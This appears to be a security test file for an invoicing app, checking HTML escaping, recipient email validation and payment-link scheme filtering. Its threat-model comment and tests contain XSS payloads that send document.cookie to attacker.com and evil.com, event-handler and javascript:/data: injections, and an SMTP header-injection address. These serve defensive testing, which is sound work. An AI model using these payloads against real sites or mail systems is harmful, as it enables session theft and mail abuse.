/*
  ══════════════════════════════════════════════════════════════════════════════
  SECURITY TEST: Input Validation & XSS Prevention
  File: security/validation.test.js
  ══════════════════════════════════════════════════════════════════════════════

  WHY THIS MATTERS (threat model):
  ─────────────────────────────────
  The send-invoice edge function builds a raw HTML email from user-supplied
  fields: vendor name, customer name, notes, line item descriptions.
  Email clients render HTML: many without a Content Security Policy.
  If any field is not escaped, an attacker can:

    • <script>fetch("https://attacker.com?c="+document.cookie)</script>
    • Inject hidden form fields that redirect payment to another account
    • Break out of HTML attributes with " or ' to add event handlers

  We also validate the recipient email address with a regex before it ever
  reaches Resend's API. A malformed address can cause bounces, be used for
  header injection, or mask a SSRF attempt.

  Payment URLs are only emitted into email HTML if they start with http(s)://.
  Anything else (javascript:, data:, relative paths) is dropped entirely.

  NOTE: These tests replicate the exact logic from
  supabase/functions/send-invoice/index.ts so that any future change to
  that file that weakens escaping is caught here before it ships.

  WHAT WE VERIFY:
  ───────────────
  1. escapeHtml neutralises all five HTML injection vectors: < > & " '
  2. null / undefined inputs return empty string without throwing
  3. Nested / compound injection strings are fully escaped
  4. Valid email addresses pass the regex
  5. Invalid, multiline, and header-injection email addresses are rejected
  6. Payment URLs are only passed through for http:// and https:// schemes
  7. javascript: and data: URLs are rejected as payment links
  ══════════════════════════════════════════════════════════════════════════════
*/

import { describe, it, expect } from "vitest";

describe("Security", () => {

// ── Replicated from supabase/functions/send-invoice/index.ts ─────────────────
// Keep this in sync with the edge function. If you change it there, change it
// here and run npm test to confirm the new behaviour is still safe.

function escapeHtml(str) {
  if (str == null) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

function sanitizePaymentUrl(url) {
  return url && /^https?:\/\//i.test(url) ? url : null;
}
// ─────────────────────────────────────────────────────────────────────────────

describe("escapeHtml: XSS prevention", () => {
  it("escapes < (open tag vector)", () => {
    expect(escapeHtml("<script>")).toBe("&lt;script&gt;");
  });

  it("escapes > (close tag vector)", () => {
    expect(escapeHtml("a > b")).toBe("a &gt; b");
  });

  it("escapes & (entity injection / double-encoding vector)", () => {
    expect(escapeHtml("Fish & Chips")).toBe("Fish &amp; Chips");
  });

  it('escapes " (attribute breakout)', () => {
    expect(escapeHtml('say "hello"')).toBe("say &quot;hello&quot;");
  });

  it("escapes ' (attribute breakout in single-quoted attrs)", () => {
    expect(escapeHtml("it's")).toBe("it&#39;s");
  });

  it("handles a full script injection attempt", () => {
    const input = `<script>fetch('https://evil.com?d='+document.cookie)</script>`;
    const out = escapeHtml(input);
    expect(out).not.toContain("<script>");
    expect(out).not.toContain("</script>");
    expect(out).toContain("&lt;script&gt;");
  });

  it("neutralises img onerror XSS vector: tag becomes inert text", () => {
    /*
      escapeHtml is a character escaper, not a tag stripper.
      The word "onerror" stays in the output as plain text, but the surrounding
      < > characters are escaped so the browser never interprets it as a tag.
      The rendered output is literal text: <img src=x onerror="alert(1)">
    */
    const input = `<img src=x onerror="alert(1)">`;
    const out = escapeHtml(input);
    expect(out).not.toContain("<img");          // angle bracket is gone
    expect(out).toContain("&lt;img");           // replaced with entity
    expect(out).toContain("&quot;alert(1)&quot;"); // quotes escaped
  });

  it("handles HTML attribute injection with double-quote breakout", () => {
    const input = `" onmouseover="alert(1)`;
    const out = escapeHtml(input);
    expect(out).not.toContain('"');
    expect(out).toContain("&quot;");
  });

  it("neutralises compound / nested injection: all special chars escaped", () => {
    /*
      "onclick" is plain ASCII: it stays in the output as text.
      What matters is that < > & ' " are all escaped, so the browser
      can never interpret this as executable HTML.
    */
    const input = `<b onclick='alert("XSS")'>&copy;</b>`;
    const out = escapeHtml(input);
    expect(out).not.toContain("<b");             // open tag gone
    expect(out).toContain("&lt;b");             // replaced with entity
    expect(out).not.toContain("'");             // single quotes escaped
    expect(out).toContain("&#39;");
    expect(out).toContain("&amp;");             // & escaped
    expect(out).toContain("&quot;");            // double quotes escaped
  });

  it("returns empty string for null", () => {
    expect(escapeHtml(null)).toBe("");
  });

  it("returns empty string for undefined", () => {
    expect(escapeHtml(undefined)).toBe("");
  });

  it("coerces numbers to string without throwing", () => {
    expect(escapeHtml(42)).toBe("42");
  });

  it("does not double-escape already-safe strings", () => {
    expect(escapeHtml("Hello World")).toBe("Hello World");
  });
});

describe("EMAIL_RE: recipient validation", () => {
  const VALID = [
    "user@example.com",
    "user+tag@example.com",
    "user@sub.domain.co.uk",
    "invoices@invoiceprepper.com",
    "first.last@company.io",
  ];

  const INVALID = [
    "",                         // empty
    "notanemail",               // no @ or domain
    "@nodomain.com",            // no local part
    "user@",                    // no domain
    "user @example.com",        // space in local part
    "user@exam ple.com",        // space in domain
    "user\n@example.com",       // newline: SMTP header injection
    "user\r@example.com",       // carriage return: header injection
    "user@example.com\nBcc: victim@other.com", // classic header injection
    "user@example",             // no TLD dot
  ];

  it.each(VALID)("accepts valid address: %s", (addr) => {
    expect(EMAIL_RE.test(addr)).toBe(true);
  });

  it.each(INVALID)("rejects invalid / injection address: %s", (addr) => {
    expect(EMAIL_RE.test(addr)).toBe(false);
  });
});

describe("sanitizePaymentUrl: payment link safety", () => {
  it("passes through https:// links unchanged", () => {
    const url = "https://buy.stripe.com/test_abc123";
    expect(sanitizePaymentUrl(url)).toBe(url);
  });

  it("passes through http:// links (for local/test environments)", () => {
    const url = "http://localhost:3000/pay";
    expect(sanitizePaymentUrl(url)).toBe(url);
  });

  it("blocks javascript: scheme", () => {
    expect(sanitizePaymentUrl("javascript:alert(1)")).toBeNull();
  });

  it("blocks data: scheme", () => {
    expect(sanitizePaymentUrl("data:text/html,<script>alert(1)</script>")).toBeNull();
  });

  it("blocks relative paths", () => {
    expect(sanitizePaymentUrl("/pay/evil")).toBeNull();
  });

  it("blocks null and undefined", () => {
    expect(sanitizePaymentUrl(null)).toBeNull();
    expect(sanitizePaymentUrl(undefined)).toBeNull();
  });

  it("blocks empty string", () => {
    expect(sanitizePaymentUrl("")).toBeNull();
  });

  it("is case-insensitive for the scheme check", () => {
    expect(sanitizePaymentUrl("HTTPS://stripe.com/pay/abc")).not.toBeNull();
  });
});


}); // Security